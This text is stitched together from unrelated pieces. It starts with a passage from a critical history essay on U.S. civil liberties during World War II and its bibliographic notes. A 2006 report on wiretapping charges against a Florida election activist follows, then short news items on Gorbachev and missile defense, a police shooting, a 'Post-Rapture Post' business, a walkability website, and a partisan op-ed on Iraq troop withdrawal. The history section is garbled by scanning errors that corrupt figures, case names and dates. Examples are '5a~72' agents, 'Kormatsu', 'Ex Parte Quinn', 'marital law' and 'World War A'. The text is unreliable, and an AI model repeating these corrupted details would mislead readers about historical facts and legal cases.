Not until the Presidency of Gerald Ford did she receive a retroactive full pardon . / 41
Another of those broadcasters was Ezra Pound , the renowned poet .
He had worked for Radio Rome .
The government did not even bother formally to convict him .
Instead , it incarcerated him without a trial in a mental hospital for thirteen years . / 42
Concomitant with the State 's new attention to the crime of espionage was the birth of the U.S. intelligence community , with its ubiquitous influence upon policy .
The number of FBI special agents swelled from 851 in 1939 to 5a~72 in 1944 .
The Bureau also moved into other countries , gaining responsibility for intelligence and counter - espionage in Latin America .
To carry on covert actions elsewhere , Roosevelt created the Office of Strategic Services ( OSS ) in July 1941 , with the flamboyant General William " Wild Bill " Donovan at its helm .
The OSS originated from the Coordinator of Information 's office , created five months prior to Pearl Harbor .
It grew prodigiously during the war and afterwards blossomed into the Central Intelligence Agency .
/43
The military intelligence services expanded their activities as well .
Their most notable operation was the worldwide interception , decoding , and analysis of radio communications .
Conducted primarily by the army 's Signal Security Agency , this electromagnetic eavesdropping contributed significantly to many Allied military victories .
It also sometimes provided sensitive information about American citizens .
It did not cease with the war 's end , but rather beginning in 1952 fell under the auspices of the National Security Agency , today the U.S. 's largest and most secret intelligence agency . / 44
Concern for loyalty within the State apparatus itself reached new levels .
In this one area , Congress pushed the Roosevelt Administration further than the administration wished to go .
The Communist Party 's enthusiasm for the war brought a rapprochement with the administration , symbolized by F.D.R.'s pardon of Browder , tile party leader convicted before Pearl Harbor of passport fraud .
Other Communists convicted under state law also received pardons .
But the Dies Committee did not go along with this rapprochement and continued to attack the administration for harboring subversives .
This induced the executive branch to augment its own loyalty program and lengthen the Attorney General 's list of subversive organizations .
As the war drew to a close , the House voted to convert the Committee on Un - American Activities from a special committee , requiring yearly renewal , to a permanent standing committee .
The one bright spot in the U.S. civil liberties record during World War II was the courts .
They ultimately upheld convictions against only about one - fourth of all the seditionists prosecuted .
The Supreme Court , in particular , thwarted many civil liberties transgressions , beginning in 1943 , when the tide of battle shifted toward the Allies .
Even so , nearly all the Court 's favorable decisions turned on narrow procedural grounds .
Only in protecting such victims of the state governments as Jehovah 's Witnesses did it strike down any repressive laws .
Thus , the Court overturned Viereck 's first conviction under the Alien Registration Act , but when the Roosevelt Administration retried him under the same act , the Court let his second conviction stand .
In Hartzel v. U.S. , it reversed the wartime Espionage Act conviction of a native fascist for distributing antiwar literature , and in Keegan v. U.S. , it reversed the mass Selective Service Act conviction of German - American Bund members , but it refused to re- view the Smith Act conviction of the Socialist Workers Party , and later , in 1951 , it upheld that act 's constitutionality .
It blocked the deportation of Harry Bridges , and the denaturalization of both a Communist and a Bundist in the Schneiderman and Baumgarter cases , but it sustained the denaturalization of another Bund member in the Knauer case .
It reinstated Esquire 's second - class mailing privileges , but it left the Post Office 's power to exclude single issues of publications intact .
It also approved FBI wiretapping in two 1942 decisions .
It overruled the treason conviction of one German - American who had sheltered the U - boat saboteurs , but in a related case , it sustained a treason conviction for the first time in its history , and in Ex Parte Quinn , it certified the extralegal railroading of the saboteurs .
It conceded that aliens had some constitutional rights in Ex Parte Kuwate , but it upheld the Federalist Alien Enemies Act in Ludecke v. Watkins .
It ruled that the military should not have closed the civilian courts in Hawaii , but only two years after marital law there had already ended .
/ 45
On the most grievous civil liberties violation of the war , the internment of Japanese - American citizens , the Court refused to rule at all .
It skirted the issue , finding in the Endo case , on the one hand , that the government could not detain citizens who had proven their loyalty ( and this only on the day after the government had opened the relocation centers ) .
On the other hand , in Hirabayshi v. U.S. and Kormatsu v. U.S. , the Court avowed the government to impose special curfews upon citizens of Japanese ancestry and to exclude them from certain areas .
/ 46
The Second World War is still today widely regarded as the U.S. State 's last " good war . "
/ 47 The partiality of establishment liberals for Franklin D. Roosevelt is notorious , but amazingly , even his Attorney General , Biddle , has a reputation as a staunch advocate of civil liberties .
The internment of Japanese - Americans is treated as an anomaly within an otherwise commendable performance .
The internment of Japanese - Americans was not an anomaly .
It was representative of a wartime administration that respected civil liberties only so far as political expediency required .
The repression of others whose enthusiasm for American participation in the Second World War was even slightly suspect differed in scale , not in degree .
Furthermore , the repressive instruments established during this period would again be put to effective use during the McCarthy Era and the Vietnam War .
The Roosevelt Administration established virtually all the precedents for Cold War political harassment .
If this is what we can expect from a " good war , " we can only tremble at the thought of what the next " bad war " might bring .
Notes
The revisionist interpretation of U.S. entry into World War
If was presented in the immediate post - war period in Charles A. Beans , American Foreign Policy in the Making , 1932 - 1940 ( New Havens Yale University Press , 1946 ) , and President Roosevelt and the Coming of War , 1941 : A Study in Appearances and Reality ( New Haven : Yale University Press , 1948 ) ; George Morgenstern , Pearl Harbor : The Story of the Secret War ( New York Devin - Adair , 1947 ) ; William Henry Chamberlin , America 's Second Crusade ( Chicago : Henry Regnery , 1950 ) ; Frederic R. Sanborn , Design for War : A Study of Secret Power Politics , 1937 - 1941 ( New York : Devin- Adair , 1951 ) ; Charles Callan Tansill , Back Door to War : The Roosevelt Foreign Policy ( Chicago : Henry Regnery , 1952 ) ; Harry Elmer Barnes , ed. , Perpetual War for Perpetual Peace : A Critical Examination of the Foreign Policy of Franklin Delano Roosevelt and Its Aftermath ( Caldwell , ID : Caxton , 1953 ) ; and Robert A. Sepaloid , The Final Secret of Pearl Harbor : The Washington Contribution to the Japanese Attack ( New York : Devin - Adair , 19 54 ) .
After this initial outpouring , revisionist scholarship fell dormant .
The alleged reason -- according to orthodox historiography -- was that revisionism had been discredited .
In reality what happened was that the orthodox historians incorporated the salient features of the revisionist account without admitting the fact
The early orthodox accounts of U.S. entry into World War II , such as Basil Rauch , Roosevelt : From Munich to Pearl Harbor ( New York Creative Age Press , 1950 ) , endeavored to portray the U.S. government as genuinely surmised by the Pearl Harbor attack .
But such later orthodox accounts as William L. Langer and S. Everett Gleason , The World Crisis and American Foreign Policy , 2 v . ( New York Harper & Brothels , 1952 - 3 ) , and Robert A. Divine , The Reluctant Belligerent : American Entry into the Second World War ( New York : John Wiley , 1965 ) , in contrast did not dispute the revisionist factual claim that the Roosevelt administration both strongly desired and fully anticipated U.S. involvement in World War I .
They instead merely argued that U.S. involvement was a worthy goal , and some went so far as to criticize Roosevelt for not achieving that goal rapidly enough .
One of the few recent revisionist works to challenge the strategic necessity of U.S. intervention into World War II is Bruce M. Russett , No Clear and Present Danger : A Skeptical View of the US .
Entry into World War II ( New York Harper & Row , 1972 ) .
On the passage of the Lend - Lease Act , see Warren F. Kimball , The Most Unsordid Act : Lend - Lease , 1939 - 1941 ( Baltimore : John Hopkins Press , 1969 ) .
On the peacetime introduction of conscription , see John O'Sullivan , From Voluntarism to Conscription , Congress and Selective Service , 1940 - 1945 ( New York Garland , 1982 ) , which is the published version of a dissertation written ten years earlier .
The official overview of prewar mobilization in general is Bureau of the Budget , The United States at War : Development and Administration of the War Program by the Federal Government ( Washington Government Printing Office , [ 1946 ] ) .
The relevant sections of Paul A.C. Koistinen , The Military Industrial Complex : Historical Perspectives ( New York : Praeger , 1980 ) , offer a more critical survey .
Because so many authors have accepted the myth about the relative mildness of U.S. civil liberties ' violations during World War II , the treatment of that subject is generally woeful .
Even the highly competent and usually meticulous historian Harold M. Hyman , in his otherwise excellent overview of civil liberties in U.S. history , To Try Men 's Souls : Loyally Tests in American History ( Berkeley : University of California Press , 1960 ) , makes the glaring error on p. 329 of finding " only twenty - six " federal indictments under security statutes that " emerged from World War II . "
He is apparently counting just the mass sedition trial , in fact , just the initial indictment , and overlooks all the remaining 270 or so prosecutions for both sedition and espionage .
There are to my knowledge only three works , all devoted to broader subjects , that give reasonably complete pictures of State repression during World War II : 1 . Robert Justin Goldstein 's sprawling chronicle of U.S. civil liberties in the twentieth century , Political Repression in Modern America : From 1870 to the Present ( Cambridge : Schenkman , 1978 ) .
Goldstein tries to be comprehensive , but his work is a somewhat uncritical compilation based on secondary sources , with a heavy emphasis on labor violence , and it ignores such other forms of civil liberty violations as obscenity laws .
2 . Geoffrey Perrett 's account of domestic events during World War II , Days of Sadness , Years of Triumph : The American People , 1939 - 1945 ( New York Coward McCann & Geoghegan , 1973 ) .
Perrett always presents a provocative slant and forcefully overturns many myths about World War II , but he can sometimes be careless about details .
3 . Leo P. Ribuffo's study of the prewar and wartime far right , The Old Christian Right : The Protestant Far Right from the Great Depression to the Cold War ( Philadelphia Temple University Puss , 1983 ) .
It is Ribuffo who coined the term Brown Scare , " and I will have more to say about his work below .
Two other homefront accounts that look into civil liberties more briefly or more selectively are Richard Polenberg , War and Society : The United States , 1941 - 1945 ( Philadelphia : J.P. Lippincott , 1972 ) , and John Morton Blum , V Was For Victory : Politics and American Culture During World War II ( New York : Harcourt Brace Jovanovich , 1976 ) .
One article devoted specifically to this subject , Richard W. Steele , " Franklin D. Roosevelt and His Foreign Policy Critics , " Political Science Quarterly , 94 ( Spring 1979 ) , 15 - 32 , hardly scratches the surface .
It is chiefly interesting for the trailing comment ( pp. 33 - 5 ) by Arthur M. Schlesinger , Jr. , who makes a pathetic attempt to salvage the civil liberties reputation of his presidential idol .
Thus , to get the full story , one must really piece it together from historical accounts of its component parts .
A good place to start is with the Annual Reports of the American Civil Liberties Union , which have different titles , but which the N.Y .
Times publishing house has compiled into convenient bound volumes .
v. 3 , July 1937 - June 1944 , and v. 4 , July 1944 - December 1950 ( New York : Arno Press , 1970 ) , cover the Second World War period .
One should also examine In Brief Authority ( Garden City , NY : Doubleday , 1962 ) , the memoirs of Francis Biddle , F.D.R.'s wartime Attorney General .
That alone should be sufficient to deflate Biddle 's exaggerated reputation as a civil libertarian .
On the prewar isolationists , see Wayne S. Cole 's definitive Roosevelt and the Isolationists , 1932 - 45 ( Lincoln University of Nebraska Press , 1983 ) .
Cole fully exposes F.D.R.'s civil liberties transgressions during the contest with the isolationists .
Cole 's older America First : The Battle against Intervention , 1940 - 1941 ( Madison : University of Wisconsin Press , 1953 ) is the basic work on the America First Committee .
An analysis of the battle between isolationists and interventionists in Congress is David L. Porter , The Seventy - Sixth Congress and World War II , 1939 - 1940 ( Columbia University of Missouri Press , 1979 ) .
John E. Wiltz , In Search of Peace : The Senate Munitions Inquiry , 1934 - 36 ( Baton Rouge : Louisiana State University Press , 1963 ) , covers the Nye Committee investigations .
Ribuffo's Old Christian
Right is outstanding not only for its account of State repression , but also because it is one of the few really scholarly and objective studies of the World War II far right .
It finally transcends the moral indignation , the pseudo - scientific reliance upon the concept of " extremism , " and the amateurish psychologizing that cloud most of the literature on the subject .
Geoffrey S. Smith , To Save a Nation : American Countersubversive , the New Deal , and the Coming of World War II ( New York : Basic Books , 1973 ) , is an equally important work that achieves the same level of historical detachment
He shows how the far right changed from an anti-immigrant phenomenon at the end of World War I to an anti-Establishment one at the beginning of World War A , and in the process turned the countersubversive propaganda techniques used so effectively by the State during the Red Scare against the State .
Similarly dispassionate on the German - American Bund is Sander A. Diamond , The Nazi Movement In The United States , 1924 - 1941 ( Ithaca : Cornell University Press , 1974 ) .
With useful facts on the same subject , but not at all dispassionate , is Leland V. Bell , In Hitler 's Shadow : The Anatomy of American Nazism ( Port Washington , NY : Kennikat Press , 1973 ) .
Two older studies that lean toward the exposé approach , but that have information on organizations and individuals within the far right that more recent studies have not yet gotten to , are Donald S. Strong , Organized Anti-Semitism In America : The Rise of Group Prejudice during the Decade , 1930 - 1940 ( Washington .
American Council on Public Affairs , 1941 ) , and Morris Schonbach , " Native Fascism during the 1930s and 1940s : A Study of Its Roots , Its Growth and Its Decline " ( Ph.D. dissertation : University of California at Los Angeles , 1958 ) .
The classic account of the growth of Communist influence during the popular - front era remains Eugene Lyons , The Red Decade : The Stalinist Penetration of America ( Indianapolis : Bobbs - Merrill , 1941 ) .
A more modern study is Earl Latham , The Communist Controversy in Washington : From the New Deal to McCarthy ( Cambridge : Harvard University Press , 1966 ) .
For the twists and turns in Communist Party policy , see Irving Howe and Lewis Closer , The American Communist Party : A Critical History ( 1919 - 1957 ) ( Boston : Beacon Press , 1957 ) , and Philip J. Jaffe , The Rise and Fall of American Communism ( New York : Horizon Press , 1975 ) .
The Dies Committee and its predecessors are the subject of August Raymond Ogden , The Dies Committee : A Study of the Special House Committee for Investigation of Un- American Activities , 1938 - 1944 ( Washington : Catholic University Press , 1945 ) , and Walter Goodman , The Committee : The Extraordinary Career of the House Committee on Un - American Activities ( New York : Farrar , Strauss and Giroux , 1968 ) .
The Ogden book , although older and dryer , is more scholarly .
It would be nice to have a book on passage and pre-Cold War enforcement of the Smith Act or one on all the World War II repressive legislation .
Until then , we must be satisfied with the account of the Smith Act 's passage contained in the first two chapters of Michal R. Belknap , Cold War Justice : The Smith Act , the Communist Party , and American Civil Liberties ( Westport , CT : Greenwood Press , 1977 ) .
Schonbach , " Native Fascism during the 1930s and 1940s , " is one of the few works to give reasonably complete coverage to the other prewar security laws .
The older works on the FBI , Fred J. Cook , The FBI Nobody Knows ( New York : Macmillan , 1964 ) , and Max Lowenthal , The Federal Bureau of Investigation ( New York William Sloane Associates , 1950 ) , are still useful for background .
The Bureau 's officially authorized history , Don Whitehead , The FBI Story : A Report to the People ( New York : Random House , 1957 ) , is less critical and far less informative .
A better balanced defense of the Bureau that criticizes both the Cook and Lowenthal books is Harry and Bonaro Overstreet , The F.B.I. in Our Open Society ( New York .
W.W. Norton , 1969 ) .
We have recently found out a lot about the FBI 's operations during the World War II period with the help of the Freedom of Information ACL
Of the works incorporating this information , the most important is Kenneth O'Reilly , Hoover and the Un- Americans :
The FBI , HUAC , and the Red Menace ( Philadelphia Temple University Press , 1983 ) .
It covers the FBI 's relationship with the Dies Committee , and is also the first work to document the FBI 's continued political surveillance of radicals through the twenties .
Other newer works on the FBI and political surveillance are Athan Theoharis , Spying On Americans : Political Surveillance from Hoover to the Huston Plan ( Philadelphia Temple University Press , 1978 ) ; Athan G. Theoharis , ed. , Beyond the Hiss Case : The FBI , Congress , and the Cold War ( Philadelphia : Temple University Press , 1982 ) ; and Frank J. Donner , The Age of Surveillance : The Aims and Methods of America 's Political Intelligence System ( New York : Alfred A. Knopf , 1980 ) .
Unfortunately , Theoharis and Donner , both being swept up unconsciously in the liberal Roosevelt cult , devote far too much energy to quibbling over whether the FBI went beyond F.D.R.'s prewar mandates in its domestic operations .
In a class by itself is Richard Gil Powers , G - Men : Hoover 's FBI in American Popular Culture ( Carbondale : Southern Illinois University Press , 1983 ) .
This ambitious study links a judicious political history of the FBI with a far - ranging cultural history of American attitudes toward crime and law enforcement .
The mass media is , of course , the bridge between the two , and Powers exposes Hoover 's very astute manipulation of the media William R. Corson , Armies of Ignorance : The Rise of the American Intelligence Empire ( New York : Dial , 1977 ) , p. 69 .
Corson 's book is a massive general history of the U.S. intelligence community with many details not found elsewhere .
For instance , although the book was published before the incriminating documents were secured through the Freedom of Information Act , Corson reports the rumor that Assistant Attorney General William J. Donovan ( later of OSS fame ) informed Coolidge 's Attorney General , Harlan Fisk Stone , about Hoover routinely violating the directive against political surveillance .
Donovan 's revelation , however , had no effect .
For a scholarly study of a prominent individual within the antiwar far right who was at the fringes of the isolationist movement and who was a defendant in not only the mass sedition trial but in other wartime sedition cases , see Niel M. Johnson , George Sylvester Viereck : German - American Propagandist ( Urbana University of Illinois Press , 1972 ) .
Johnson 's book is hostile to its subject , but still reliable .
For a sensationalist -- almost hysterical -- contemporary " expose " of Nazi mail propaganda within the U.S. during World War II , see Henry Hoke , Black Mail ( New York : Reader 's Book Service , 1944 ) .
The most thorough account of German espionage within the U.S. is Ladislas Farago , The Game of the Foxes : The Untold Story of German Espionage in the United States and Great Britain daring World War II ( New York : David McKay , 1971 ) , although Farago has a journalistic tendency to exaggerate the overall importance of his subject .
There is also some coverage of World War II espionage and treason prosecutions in two books by Nathaniel Weyl : Treason : The Story of Disloyalty and Betrayal in American Wars ( Washington : Public Affairs Press , 1950 ) and The Battle against Disloyalty ( New York : Thomas Y. Crowell , 1951 ) .
The titles and publication dates give away the McCarthyite bias of these highly colored and unreliable studies .
They at least show no favoritism to either the extreme right or extreme left ;
Weyl heartily endorses government suppression of both .
Even that virtue eludes a recent work in the same disreputable category : Charles Higham , American Swastika ( Garden City , NY : Doubleday , 1985 ) .
Professing to be a history of Nazi penetration of the U.S. up to the present day , the book dredges up and seriously advances the long - discredited allegations about Nazi collusion with respectable isolationists .
It is astonishing in this day and age to find a new book that actually bemoans the fact that Roosevelt could not get authority " allowing for the incarceration of known enemy collaborators without trial . "
Indeed , Higham makes this complaint on p. 31 , with reference to the pre-Pearl Harbor period .
Another redeeming feature of Weyl 's books is that they are not overly concerned with the somewhat arbitrary distinction between antiwar dissent and espionage .
Most civil libertarians still treat espionage , at least during the Second World War , as beyond the pale .
As a result , no serious scholar has yet approached World War II espionage prosecutions from a civil liberties perspective .
Any historical accounts , like Farago's , focus on the spying and apprehension parts of the story and tell us little or nothing about the actual trials or the precise laws under which the prosecutions were conducted .
The best treatment of the Tyler Kent espionage case is contained in Richard J. Whalen 's biography of the U.S. ambassador to England at the time , The Founding Father : The Story of Joseph P. Kennedy ( New York : New American Library , 1964 ) , pp. 309-20 .
An earlier brief for Kent is John Howland Snow , The Case of Tyler Kent ( New York Domestic and Foreign Affairs Press , 1946 ) .

In contrast to Japanese - American internment , U.S. internment of " enemy " aliens during World War II is wide open for research .
It only receives mention in passing from works on other subjects , and the government has still to release the documents on alien internment facilities within its World War II concentration camp system .
Although the Justice Department was responsible for alien internment , the camps used for this purpose were run by the military as part of its POW system .

Virtually the only scholarly attempt to open up this subject is a recent journal article , John H. Culley , " Trouble at Lordsburg Internment Camp , " New Mexico Historical Review , 60 ( Jul 1985 ) , 225 17 .

Japanese - American internment , of course , has received an inordinate amount of scholarly attention .

Because it resulted in a conviction ( albeit , one that was overturned by the Supreme Court ) , the mass trial of the German - American Bund members under the Selective Service
Act deserves as much scholarly and journalistic attention as the mass sedition trial .
But , alas , it has received very little .
The only places that give much detail about the black antiwar religious cults and about the government prosecutions of their members are chapter twenty - two of Roi Ottley , ' New World A - Coming ' : Inside Black America ( Boston : Houghton Miffllin , 1943 ) , and pp. 103 - 5 of Neil A.

Wynn 's comments are based on more recent research , but he makes an unfounded distinction between prosecutions for sedition and for urging draft resistance .

Florida activist , candidate charged with felony wiretapping Miriam Raftery
Published : Tuesday October 17 , 2006 Print This Email
This The State of Florida has filed felony wiretapping charges against election reform activist Charles Grapski for audiotaping his efforts to obtain public records related to his investigation of alleged election fraud , RAW STORY has learned .
He faces arraignment Tuesday , October 17th .
" The State has held charges over my head since May 1st , six months , " Grapski told RAW STORY .
" I have not been allowed until now the right of subpoena power to do discovery in my own defense .
Now the State is saying I must choose between two rights : the right to a speedy trial , and my right to a fair trial . "
RAW STORY has previously reported on officials ' attempts to suppress Grapski's investigation and that Grapski was later banned by a judge from campaigning in the City of Alachua .
Grapski , a Democrat , said he dropped out of his bid to win election to the House of Representatives due to the unresolved threat of legal challenges and the judicial ban , which made it impossible for him to campaign in his district .
He endorsed Democrat Chuck Chestnut IV , who won the primary race .
" This is such a severe case of silencing and a violation of the First Amendment , " said Carol Thomas , co-coordinator of Grapski 's defense committee , along with Scott Doran .
" He has been as effectively banned as any black person in South Africa during Apartheid .
He is not able to contact any officials by snail mail , fax , telephone , e-mail , or even a third party person . "
Grapski is charged with felony wiretapping for making an audiotape of his efforts to obtain documents at City Hall .
Those documents related to a lawsuit alleging fraud in the canvassing of absentee ballots in the election of Commissioner James A. Lewis , who won by 18 absentee votes .
" This is not the first time that sitting Commissioners who are candidates for an election have won by absentee votes .
This seems to be a chronic problem here and nobody takes it seriously , " Thomas said .
" Suddenly absentee ballots disappear .
It 's outrageous . "
Grapski audiotaped City Manager Clovis Watson , who commented on the fact that he was being taped , consented , and kept talking , Thomas noted .
Subsequently Watson , who also serves as Police Commissioner ( an apparent violation of Florida law that prohibits officials from holding more than one public office at a time ) , ordered Grapski arrested .
" He did n't do anything a newspaper reporter does n't do every day .
It 's absurd , " Thomas said .
" While he was being arrested , the editor of a newspaper was in there audiotaping this . "
A third person , Green Party representative Michael Canney , was also present making audiotapes .
Canney and Grapski have been threatened with additional charges , but the newspaper editor has not , Thomas said .
Representatives from the office of Florida Attorney General Charlie Crist were not available for comment .
" This is why I did record the meeting , " Grapski said .
" When public officials lie , the only thing that proves wrongdoing is the very tape the state has had in its possession since this issue began . "
He added , " If I do n't exercise my right to a speedy trial , they can hold this over me for several years .
But if we demand speedy trial , we have a window of a week to act . "
The trial would then take place around Thanksgiving , he said , adding , " We are determined to get this over as quickly as possible . "
The key obstacle is money .
" We have to raise $ 40,000 this week in order for a speedy trial to occur , " Thomas revealed .
" We are trying to get together a nationwide defense fund .
The Charles Grapski Legal Defense fund may be reached c/o Carol Thomas at P.O. Box 190 , Alachua , FL 32616-0190 .
An off - duty American police officer in Connecticut shot and critically wounded his 18 - year - old daughter , apparently mistaking her for an intruder after she sneaked out of their home and re-entered through the basement .
Eric Scott , 41 , on the New Haven police force for nine years , has not been charged in Tuesday 's shooting .
" Mr Scott was under the impression his daughter had gone to bed for the night , " Stratford Captain Thomas Rodia said .
Story Highlights • Former Soviet leader says U.S. has " lost credibility in the world "
• Mikhail Gorbachev says U.S. missile plans could bring new arms race
• U.S. wants to base part of missile defense system in Eastern Europe
• Gorbachev backs Russian President Vladimir Putin's objections to the plan
Adjust font size :
MOSCOW , Russia ( CNN ) -- Former Soviet leader Mikhail Gorbachev said Wednesday that U.S. plans to build a missile defense shield in Europe are arrogant and threaten to usher in a new Cold War .
Speaking to CNN from Moscow as the Group of Eight Summit got under way in Germany , Gorbachev said the U.S. proposal -- which includes installations in Poland and the Czech Republic -- means that Europe is becoming a target again .
" I do hope the Cold War is not going to be repeated , " he said .
" We must take advantage of opportunities to avoid that . "
( Watch Gorbachev describe the U.S. plan as pitting Europe against Russia )
He said polls in the Czech Republic suggested that more than 70 percent of people opposed the missile defense program .
" There is the possibility that self - confidence , arrogance , will lead to a situation similar to that with the war in Iraq , " Gorbachev warned in a wide - ranging discussion of American policy .
" The U.S. is driving itself into a corner -- they 've lost credibility in the world . "
He said Washington's " intimidating " behavior is different from the spirit that existed after the end of the Cold War .
" Europe is not a guinea pig , " he said .
Gorbachev added that Russian President Vladimir Putin was right to say the anti-missile project is an attempt to set Europe against Russia .
" We are being drawn into another arms race , " he said .
Gorbachev was the leader of the Soviet Union from 1985 until its dissolution in 1991 .
He presided over a thaw in his country 's icy relations with the United States and its move toward glasnost , or openness , in the 1980s .
He won the Nobel Peace Prize in 1990 .
On Iran , Gorbachev agreed that a nuclear - armed Tehran must be opposed .
But he said that starting a war would be a " catastrophic mistake . "
" Some people think that missiles can solve everything , " he said , without specifying .
" We were told in this way the problem of Iraq would be resolved . "
Gorbachev said the international community had not yet exhausted political and diplomatic options and added that he sees no value to introducing sanctions against Iran .
Gorbachev said that Russian democracy is growing despite its problems .
He noted that the courts do n't work and some media outlets have made deals with the authorities .
But there is now , he said , a relatively free press .
Russia is moving from a totalitarian regime to democracy , he said , but it is only halfway there .
Meanwhile , President Bush on Wednesday promised to work toward resolving the political tensions between the U.S. and Russia that threaten to overshadow this week 's G8 gathering in Heiligendamm , Germany , near Rostock .
" Russia is not an enemy , " Bush said when asked about Putin 's threat to point missiles at European targets in protest of American plans for a Europe - based missile defense system .

Facebook Neither snow , nor rain , nor fire and brimstone will keep Joshua Witter from the swift completion of his appointed rounds come the end of the world .
Witter , a 24 - year - old self - described atheist living in Orlando , is the creator of the Post - Rapture Post , which bills itself as " the postal service of the saved . "
For as little as $ 4.99 , Witter offers to deliver your letters to friends and loved ones left behind after the Rapture , when some Christians believe they will be whisked up to heaven while everyone else — the " Left Behind " of the popular book series — suffers a series of tribulations .
As Witter sees it , it will fall to the unsaved to serve as the postmen of the Apocalypse .
" Do you want to take the chance that your loved ones will have to suffer through your ascension into Heaven without knowing how you really feel in your heart ? " the site asks .
" Sign up for the Post - Rapture Post today to guarantee that , while you are gone , you will remain in the thoughts of those left behind . "
" Holy crap , a plan B. , " wrote one of the site 's visitors , known only as Fred B. from Oregon .
" This is my kind of religion . "
Others were n't so charitable .
" I am shocked at your website , " penned a woman identified as Kim F .
" It is not even remotely funny .
...
All who are a part of this , surely , God will judge to damnation . "
As an atheist , one of the things Witter does n't believe in is any sort of damnation .
Or the Rapture .
Or God , for that matter .
Even if there is a Rapture , he said , it 's best to prepare because Witter is pretty sure he 'll be one of the many left behind .
" The Bible says that only those that repent of their sins and accept Jesus as the True Son of God will be saved , " the site reads .
" We do neither .
Some of our personal sins include : drunkenness , heresy , sacrilege / blasphemy , gluttony , laciviousness , and sloth .
There is no way we are going to disappear into Heaven any time soon . "
Witter guarantees that should the Rapture arrive , he would deliver all letters entrusted to him .
He created the website in 2004 after graduating from Syracuse University .
" My friends think it 's hilarious , " he said .
" We all like it . "
But he also thinks it is logical .
" If you are a good person after the Rapture , ( you 'll ascend ) , " Witter said .
" If you have a son you want to behave so that he might also see Jesus , " you send him a letter .
Social bookmarking sites and the blogosphere have generated interest in the Post - Rapture Post .
Witter said he received about 2,000 e-mails after fark.com posted a link to the site .
So far , just 11 people have purchased letters from Witter 's site , all of whom chose the least expensive , Class I message for $ 4.99 .
Letters that are delivered on fancy resume paper are available for $ 9.99 , but medieval - style parchment costs $ 799.99 .
" I wish someone would order the expensive one , " Witter said .
The merchandise on the site is more popular .
Witter said he has sold about 300 T - shirts , Rapture survival guides and coffee mugs .
He is not sure how much money he 's made , but says it 's enough to at least break even .
It also has earned him a few nasty letters .
" I get about 80 % hate mail , " Witter acknowledged .
The other 20 % fall roughly into two categories : people who appreciate the satire , and fellow atheists — offering their services as postal workers after the Rapture .

Cool New Thing : What ’s Your Walk Score ?
As if USA Today featuring the " Complete Streets " movement on its front page were n’t enough to make one realize that walking is the biggest new way to earn your " green " points , a cool web site , Walk Score , rates the walkability of any location in the United States on a 0 - 100 scale .
Based on the number of retail businesses and amenities near an address , this site analyzes how frequently one is likely to need to drive in the daily course of life .
The closer things are to the places you ’re likely to need , the better your score .
Finally , a site that attempts to quantify the economic , environmental and social benefits of living in a city .
Above is the walk score for the Rocky Mountain Institute , the environmental think tank with the slogan " Abundance by Design . "
Given their score , 6 out of 100 , one can see why they are focused on creating super - efficient vehicles that run on food but are silent , as far as I can tell , about the benefits of driving less , walking more , and interacting more with ones neighbors .
By its own admission , Walk Score has its flaws .
Most glaringly , it does not include the proximity to transit stops .
Also , it measures distance to a destination as the crow flies instead of as the cul - de - sac bends or halts one ’s journey .
But after plugging in a bunch of addresses , it seems remarkably accurate .
Take for example , what has got to be the most walkable neighborhood in the country , planned , according to legend , by 17th century Dutch cows .
When I lived there , I could go to my office , the subway , multiple restaurants , the pharmacy , and a bar without crossing the street , and the supermarket , the bank , more restaurants and bars and the bookstore were all just a minute or two away on foot .
Walk Score , I think , rated it correctly :
Michael Moore meets up with Dr. Gupta on Larry King to air out their differences because of a " fact check " segment Sanjay did about " Sicko " that Moore took exception to with Wolf Blitzer .
Gupta did admit to an error regarding in his piece about claiming Moore said the per capita spending on health care in Cuba was $ 25 instead of $ 251 ...
Download Download
By the end of their segment , despite Gupta trying to pull the whole " no system is perfect , so why even try ? " argument , they do end up agreeing with each other on the larger issue --- health care reform .
I hope CNN will stop running this segment .
Adam Howard : " As Gupta tries to defend his clearly biased report by claiming Moore has " cherry - picked " his numbers ( a typical tactic employed by Moore 's right - wing detractors ) , Moore explains that all of his figures are from 2007 and were generated from President Bush 's Health and Human Services
Word has just come out that President Bush will offer to take out 30,000 troops from Iraq by next August -- maybe , if all of his conditions are met .
So , that would leave us in the same exact place we were in November of 2006 when the American people sent the message that we should withdraw from Iraq .
This is like a department store raising prices by a 100 % one day and then having a " 50 % Off Sale " the next day .
It 's not much to brag about .
In fact , it 's a cheap salesman 's trick .
President Bush 's strategy all along has been to run out the clock until he can hand off Iraq to the next president -- and then claim they screwed it up .
This is one giant reprehensible game to avoid blame for the catastrophe in Iraq .
The president wants to be able to say that the dog ate his homework and that 's why Iraq did n't work out .
I keep hearing that Shaggy song running through my head , " It was n't me !
It was n't me ! "
If it had n't been for those darn Democrats everything he did would have worked out okay .
Except in this scenario , hundreds , if not thousands , of more Americans will die and get their arms and legs blown off so that George Bush can feel a little better about himself .
How many more American lives is George Bush 's ego worth ?
Is anyone really going to be so gullible as to buy into this cheap magician 's trick ?
According to The New York Times , unfortunately , that 's an excellent possibility .
Democrats are considering buckling for a record one millionth time in a row .
The so - called compromise that is being discussed within the Democratic caucus right now is nearly identical to Bush 's proposal .
That is so stupid it makes the head hurt .
Can someone please help us ?
Will anyone represent us ?
Where are our so - called leaders ?
I would like to buy the Democrats a clue .
According to the latest USA Today / Gallup poll , 60 % of Americans are to the left of you !
They answered that they are in favor of hard deadlines for withdrawal no matter what the conditions on the ground are .
That is considerably starker than the average Democrat 's position .
By the way , this was a poll question loaded to get a low answer .
Who is really going to say they are for withdrawal no matter what the conditions are ?
Well , apparently a huge majority of Americans .
Even with that kind of loaded question , sixty percent said we have to go -- no matter what .
Are you listening Democrats ?
The amount of disdain the Democrats will have earned if they buckle again will be immeasurable .
Even with overwhelming American support behind them , the most deeply unpopular president of all time and the country in a mood for dramatic change , if they give in to Bush again , the world will not be able to contain our disgust with them .
Bush will announce shortly on national television that he is so magnanimous that he is willing to go back to pre-surge numbers a year from now .
It reminds me of Joaquin Phoenix 's character in Gladiator yelling , " Am I not merciful ?!
Am I not merciful ? ! "
I 'm going to go with " no " on that one .
So , what will the Democrats answer be ?
Will they thank the worst president in history for going back to his original unreasonable position ?
Will they allow him to run out the clock on his presidency while our kids keep getting killed for no reason whatsoever ?
Will they allow him to make the audacious claim that he is being conciliatory by offering to withdraw absolutely no net troops since the 2006 elections ?
Will they keep whining and complaining about not having enough votes before they even try to use public pressure to get Republicans to change their votes ?
Do they not understand that Republicans have to change their votes or lose in the next election -- unless they are given cover by the Democrats by passing a meaningless , non-binding bill ?
Come on , really ?
Non-binding ??
